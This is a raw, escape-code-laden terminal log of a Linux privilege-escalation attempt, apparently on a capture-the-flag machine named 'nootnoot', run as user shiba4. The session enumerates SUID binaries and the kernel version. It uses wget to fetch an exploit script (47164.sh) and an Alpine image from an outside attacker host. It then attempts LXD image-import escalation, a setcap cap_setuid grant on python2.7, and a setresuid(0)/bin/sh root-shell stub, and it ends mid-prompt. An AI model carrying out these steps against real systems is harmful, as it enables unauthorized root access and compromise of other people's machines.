cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[C[7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kfind / -perm -u=s -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kfind / -perm -u=s -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kfind / -perm -u=s -type f 2>/dev/null > [K[K>[K? [K[K.[K/[K?[K| more
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/su
+/bin/mount
+/opt/secret/shiba4
+/home/shiba1/shiba1
+/home/shiba2/shiba2
+/snap/core/8689/bin/mount
+/snap/core/8689/bin/ping
+/snap/core/8689/bin/ping6
+/snap/core/8689/bin/su
+/snap/core/8689/bin/umount
+/snap/core/8689/usr/bin/chfn
+/snap/core/8689/usr/bin/chsh
+/snap/core/8689/usr/bin/gpasswd
+/snap/core/8689/usr/bin/newgrp
+/snap/core/8689/usr/bin/passwd
+/snap/core/8689/usr/bin/sudo
+/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8689/usr/lib/openssh/ssh-keysign
+/snap/core/8689/usr/lib/snapd/snap-confine
+/snap/core/8689/usr/sbin/pppd
+/snap/core/8592/bin/mount
+/snap/core/8592/bin/ping
+/snap/core/8592/bin/ping6
+/snap/core/8592/bin/su
+/snap/core/8592/bin/umount
+/snap/core/8592/usr/bin/chfn
+/snap/core/8592/usr/bin/chsh
+/snap/core/8592/usr/bin/gpasswd
+/snap/core/8592/usr/bin/newgrp
+/snap/core/8592/usr/bin/passwd
+/snap/core/8592/usr/bin/sudo
+/snap/core/8592/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8592/usr/lib/openssh/ssh-keysign
+/snap/core/8592/usr/lib/snapd/snap-confine
+/snap/core/8592/usr/sbin/pppd
+[7m--More--[27m/usr/bin/gpasswd
+[7m--More--[27m/usr/bin/chfn
+[7m--More--[27m/usr/bin/sudo
+[7m--More--[27m/usr/bin/passwd
+[7m--More--[27m/usr/bin/newgrp
+[7m--More--[27m/usr/bin/pkexec
+[7m--More--[27m/usr/bin/at
+[7m--More--[27m/usr/bin/traceroute6.iputils
+[7m--More--[27m/usr/bin/newgidmap
+[7m--More--[27m/usr/bin/chsh
+[7m--More--[27m/usr/bin/newuidmap
+[7m--More--[27m/usr/lib/snapd/snap-confine
+[7m--More--[27m/usr/lib/openssh/ssh-keysign
+[7m--More--[27m/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+[7m--More--[27m/usr/lib/eject/dmcrypt-get-device
+[7m--More--[27m/usr/lib/policykit-1/polkit-agent-helper-1
+[7m--More--[27m/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ uname -r
+4.15.0-88-generic
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ uname -a
+Linux nootnoot 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ ping [K[K[K[K[K
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ wget htt[[Kp?[K://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz
+--2020-10-24 23:16:24--  http://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz
+Connecting to 10.9.185.104:80... failed: Connection refused.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ wget http://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz
+--2020-10-24 23:16:36--  http://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz
+Connecting to 10.9.185.104:80... failed: Connection refused.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ wget http://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz[C[C[C[C?/alpine-v3.12-x86_64-20201024_1913.tar.gz[1P/alpine-v3.12-x86_64-20201024_1913.tar.gz:/alpine-v3.12-x86_64-20201024_1913.tar.gz8/alpine-v3.12-x86_64-20201024_1913.tar.gz0/alpine-v3.12-x86_64-20201024_1913.tar.gz8/alpine-v3.12-x86_64-20201024_1913.tar.gz0/alpine-v3.12-x86_64-20201024_1913.tar.gz
+--2020-10-24 23:17:18--  http://10.9.185.104:8080/alpine-v3.12-x86_64-20201024_1913.tar.gz
+Connecting to 10.9.185.104:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3183094 (3.0M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20201024_1913.tar.gz’
+
+alpine-v3.12-x86_64-20201024_1913.tar.gz    0%[                                                                                    ]       0  --.-KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    0%[                                                                                    ]  13.53K  53.3KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    0%[                                                                                    ]  22.25K  39.6KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    2%[>                                                                                   ]  69.61K  91.1KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    2%[=>                                                                                  ]  89.54K  88.7KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    3%[==>                                                                                 ] 115.71K  92.0KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    4%[===>                                                                                ] 148.11K  98.0KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    5%[===>                                                                                ] 178.02K   101KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    6%[====>                                                                               ] 186.74K  88.5KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    7%[=====>                                                                              ] 235.34K  99.9KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    8%[=====>                                                                              ] 256.52K   100KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    9%[======>                                                                             ] 281.44K  98.7KB/s               alpine-v3.12-x86_64-20201024_1913.tar.gz    9%[=======>                                                                            ] 308.86K  99.4KB/s    eta 28s    alpine-v3.12-x86_64-20201024_1913.tar.gz   10%[========>                                                                           ] 335.02K  99.8KB/s    eta 28s    alpine-v3.12-x86_64-20201024_1913.tar.gz   11%[========>                                                                           ] 362.44K   100KB/s    eta 28s    alpine-v3.12-x86_64-20201024_1913.tar.gz   12%[=========>                                                                          ] 389.85K   101KB/s    eta 28s    alpine-v3.12-x86_64-20201024_1913.tar.gz   13%[==========>                                                                         ] 417.27K   101KB/s    eta 27s    alpine-v3.12-x86_64-20201024_1913.tar.gz   14%[===========>                                                                        ] 445.93K   102KB/s    eta 27s    alpine-v3.12-x86_64-20201024_1913.tar.gz   15%[===========>                                                                        ] 472.09K   102KB/s    eta 27s    alpine-v3.12-x86_64-20201024_1913.tar.gz   15%[============>                                                                       ] 485.08K  98.7KB/s    eta 27s    alpine-v3.12-x86_64-20201024_1913.tar.gz   16%[=============>                                                                      ] 520.69K   101KB/s    eta 26s    alpine-v3.12-x86_64-20201024_1913.tar.gz   17%[=============>                                                                      ] 539.38K   102KB/s    eta 26s    alpine-v3.12-x86_64-20201024_1913.tar.gz   18%[==============>                                                                     ] 564.30K   102KB/s    eta 26s    alpine-v3.12-x86_64-20201024_1913.tar.gz   18%[==============>                                                                     ] 587.98K   102KB/s    eta 26s    alpine-v3.12-x86_64-20201024_1913.tar.gz   19%[===============>                                                                    ] 615.39K   102KB/s    eta 25s    alpine-v3.12-x86_64-20201024_1913.tar.gz   20%[================>                                                                   ] 642.81K   101KB/s    eta 25s    alpine-v3.12-x86_64-20201024_1913.tar.gz   21%[=================>                                                                  ] 670.22K   106KB/s    eta 25s    alpine-v3.12-x86_64-20201024_1913.tar.gz   22%[=================>                                                                  ] 698.88K   100KB/s    eta 25s    alpine-v3.12-x86_64-20201024_1913.tar.gz   23%[==================>                                                                 ] 726.30K   102KB/s    eta 24s    alpine-v3.12-x86_64-20201024_1913.tar.gz   24%[===================>                                                                ] 753.71K   103KB/s    eta 24s    alpine-v3.12-x86_64-20201024_1913.tar.gz   25%[====================>                                                               ] 781.12K   103KB/s    eta 24s    alpine-v3.12-x86_64-20201024_1913.tar.gz   25%[====================>                                                               ] 807.29K   103KB/s    eta 24s    alpine-v3.12-x86_64-20201024_1913.tar.gz   26%[=====================>                                                              ] 835.95K   103KB/s    eta 22s    alpine-v3.12-x86_64-20201024_1913.tar.gz   27%[======================>                                                             ] 863.37K   103KB/s    eta 22s    alpine-v3.12-x86_64-20201024_1913.tar.gz   28%[=======================>                                                            ] 890.78K   108KB/s    eta 22s    alpine-v3.12-x86_64-20201024_1913.tar.gz   29%[=======================>                                                            ] 920.69K   104KB/s    eta 22s    alpine-v3.12-x86_64-20201024_1913.tar.gz   30%[========================>                                                           ] 948.10K   108KB/s    eta 22s    alpine-v3.12-x86_64-20201024_1913.tar.gz   31%[=========================>                                                          ] 974.27K   111KB/s    eta 21s    alpine-v3.12-x86_64-20201024_1913.tar.gz   32%[==========================>                                                         ]   1008K   113KB/s    eta 21s    alpine-v3.12-x86_64-20201024_1913.tar.gz   33%[===========================>                                                        ]   1.01M   111KB/s    eta 21s    alpine-v3.12-x86_64-20201024_1913.tar.gz   34%[============================>                                                       ]   1.05M   116KB/s    eta 21s    alpine-v3.12-x86_64-20201024_1913.tar.gz   35%[=============================>                                                      ]   1.08M   116KB/s    eta 19s    alpine-v3.12-x86_64-20201024_1913.tar.gz   36%[==============================>                                                     ]   1.12M   122KB/s    eta 19s    alpine-v3.12-x86_64-20201024_1913.tar.gz   38%[===============================>                                                    ]   1.16M   124KB/s    eta 19s    alpine-v3.12-x86_64-20201024_1913.tar.gz   39%[================================>                                                   ]   1.21M   132KB/s    eta 19s    alpine-v3.12-x86_64-20201024_1913.tar.gz   41%[=================================>                                                  ]   1.26M   129KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   43%[===================================>                                                ]   1.30M   138KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   43%[===================================>                                                ]   1.33M   128KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   44%[===================================>                                                ]   1.34M   119KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   45%[=====================================>                                              ]   1.39M   127KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   46%[======================================>                                             ]   1.42M   126KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   47%[=======================================>                                            ]   1.45M   125KB/s    eta 16s    alpine-v3.12-x86_64-20201024_1913.tar.gz   48%[=======================================>                                            ]   1.48M   127KB/s    eta 14s    alpine-v3.12-x86_64-20201024_1913.tar.gz   49%[========================================>                                           ]   1.51M   128KB/s    eta 14s    alpine-v3.12-x86_64-20201024_1913.tar.gz   50%[=========================================>                                          ]   1.54M   126KB/s    eta 14s    alpine-v3.12-x86_64-20201024_1913.tar.gz   51%[==========================================>                                         ]   1.58M   129KB/s    eta 14s    alpine-v3.12-x86_64-20201024_1913.tar.gz   53%[===========================================>                                        ]   1.61M   128KB/s    eta 13s    alpine-v3.12-x86_64-20201024_1913.tar.gz   54%[============================================>                                       ]   1.64M   126KB/s    eta 13s    alpine-v3.12-x86_64-20201024_1913.tar.gz   55%[=============================================>                                      ]   1.68M   129KB/s    eta 13s    alpine-v3.12-x86_64-20201024_1913.tar.gz   56%[==============================================>                                     ]   1.71M   128KB/s    eta 13s    alpine-v3.12-x86_64-20201024_1913.tar.gz   57%[===============================================>                                    ]   1.75M   126KB/s    eta 12s    alpine-v3.12-x86_64-20201024_1913.tar.gz   58%[================================================>                                   ]   1.78M   128KB/s    eta 12s    alpine-v3.12-x86_64-20201024_1913.tar.gz   59%[=================================================>                                  ]   1.81M   127KB/s    eta 12s    alpine-v3.12-x86_64-20201024_1913.tar.gz   60%[==================================================>                                 ]   1.85M   124KB/s    eta 12s    alpine-v3.12-x86_64-20201024_1913.tar.gz   62%[===================================================>                                ]   1.88M   125KB/s    eta 10s    alpine-v3.12-x86_64-20201024_1913.tar.gz   63%[====================================================>                               ]   1.92M   127KB/s    eta 10s    alpine-v3.12-x86_64-20201024_1913.tar.gz   64%[=====================================================>                              ]   1.96M   126KB/s    eta 10s    alpine-v3.12-x86_64-20201024_1913.tar.gz   65%[======================================================>                             ]   2.00M   133KB/s    eta 10s    alpine-v3.12-x86_64-20201024_1913.tar.gz   67%[=======================================================>                            ]   2.04M   143KB/s    eta 10s    alpine-v3.12-x86_64-20201024_1913.tar.gz   68%[========================================================>                           ]   2.08M   141KB/s    eta 8s     alpine-v3.12-x86_64-20201024_1913.tar.gz   70%[=========================================================>                          ]   2.13M   145KB/s    eta 8s     alpine-v3.12-x86_64-20201024_1913.tar.gz   71%[===========================================================>                        ]   2.18M   150KB/s    eta 8s     alpine-v3.12-x86_64-20201024_1913.tar.gz   73%[============================================================>                       ]   2.23M   155KB/s    eta 8s     alpine-v3.12-x86_64-20201024_1913.tar.gz   75%[==============================================================>                     ]   2.29M   161KB/s    eta 6s     alpine-v3.12-x86_64-20201024_1913.tar.gz   77%[===============================================================>                    ]   2.34M   166KB/s    eta 6s     alpine-v3.12-x86_64-20201024_1913.tar.gz   78%[=================================================================>                  ]   2.39M   172KB/s    eta 6s     alpine-v3.12-x86_64-20201024_1913.tar.gz   80%[==================================================================>                 ]   2.45M   177KB/s    eta 6s     alpine-v3.12-x86_64-20201024_1913.tar.gz   82%[====================================================================>               ]   2.50M   184KB/s    eta 4s     alpine-v3.12-x86_64-20201024_1913.tar.gz   83%[====================================================================>               ]   2.52M   176KB/s    eta 4s     alpine-v3.12-x86_64-20201024_1913.tar.gz   84%[======================================================================>             ]   2.58M   180KB/s    eta 4s     alpine-v3.12-x86_64-20201024_1913.tar.gz   86%[=======================================================================>            ]   2.62M   180KB/s    eta 4s     alpine-v3.12-x86_64-20201024_1913.tar.gz   87%[========================================================================>           ]   2.65M   180KB/s    eta 3s     alpine-v3.12-x86_64-20201024_1913.tar.gz   88%[=========================================================================>          ]   2.70M   179KB/s    eta 3s     alpine-v3.12-x86_64-20201024_1913.tar.gz   90%[===========================================================================>        ]   2.75M   182KB/s    eta 3s     alpine-v3.12-x86_64-20201024_1913.tar.gz   91%[===========================================================================>        ]   2.77M   174KB/s    eta 3s     alpine-v3.12-x86_64-20201024_1913.tar.gz   93%[=============================================================================>      ]   2.83M   172KB/s    eta 2s     alpine-v3.12-x86_64-20201024_1913.tar.gz   94%[==============================================================================>     ]   2.86M   170KB/s    eta 2s     alpine-v3.12-x86_64-20201024_1913.tar.gz   95%[===============================================================================>    ]   2.90M   170KB/s    eta 2s     alpine-v3.12-x86_64-20201024_1913.tar.gz   96%[================================================================================>   ]   2.94M   166KB/s    eta 2s     alpine-v3.12-x86_64-20201024_1913.tar.gz   98%[=================================================================================>  ]   2.98M   165KB/s    eta 0s     alpine-v3.12-x86_64-20201024_1913.tar.gz   99%[==================================================================================> ]   3.03M   165KB/s    eta 0s     alpine-v3.12-x86_64-20201024_1913.tar.gz  100%[===================================================================================>]   3.04M   166KB/s    in 24s     
+
+2020-10-24 23:17:42 (132 KB/s) - ‘alpine-v3.12-x86_64-20201024_1913.tar.gz’ saved [3183094/3183094]
+
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ ls
+[0m[01;32m47164.sh[0m                                  [01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB[0m
+[01;31malpine-v3.12-x86_64-20201024_1913.tar.gz[0m  [01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-timesyncd.service-70JAZy[0m
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ lxv[Kc imagem import ./alpine-v3.12-x86_64-20201024_1913.tar.gz --alias myimage
+Error: unknown command "imagem" for "lxc"
+
+Did you mean this?
+	image
+
+Run 'lxc --help' for usage.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ lxc imagem import ./alpine-v3.12-x86_64-20201024_1913.tar.gz --alias myimage[C[C[C[1P
+If this is your first time running LXD on this machine, you should also run: lxd init
+To start your first container, try: lxc launch ubuntu:18.04
+
+Error: Get http://unix.socket/1.0: dial unix /var/lib/lxd/unix.socket: connect: permission denied
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ lxc image import ./alpine-v3.12-x86_64-20201024_1913.tar.gz --alias myimage[1@s[1@u[1P[1P[1@s[1@y[1@d[1@o[1@ [1P[1P[1P[1P[1@u[1@d[1@o[1@ 
+[sudo] password for shiba4: 
+shiba4 is not in the sudoers file.  This incident will be reported.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ sudo lxc image import ./alpine-v3.12-x86_64-20201024_1913.tar.gz --alias myimage[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs[Kwget http://10.9.185.104:8080/alpine-v3.12-x86_64-20201024_1913.tar.gz[5P/alpine-v3.12-x86_64-20201024_1913.tar.gz[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cuname -a[Krfind / -perm -u=s -type f 2>/dev/null | more[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kfind / -perm -u=s -type f 2>/dev/null | more[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[Cls[Kwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kcd /tmpuname -a[2Pls -la[Kcdlscdls -launame -a[1Pcd /tmp[3Pwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x 47164.sh [7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kfind / -perm -u=s -type f 2>/dev/null | more[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cuname -r[Kawget http://10.9.185.104/alpine-v3.12-x86_64-20201024_1913.tar.gz:8080/alpine-v3.12-x86_64-20201024_1913.tar.gz[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcd
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
+Error: no such file "int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}"
+]0;shiba4@nootnoo
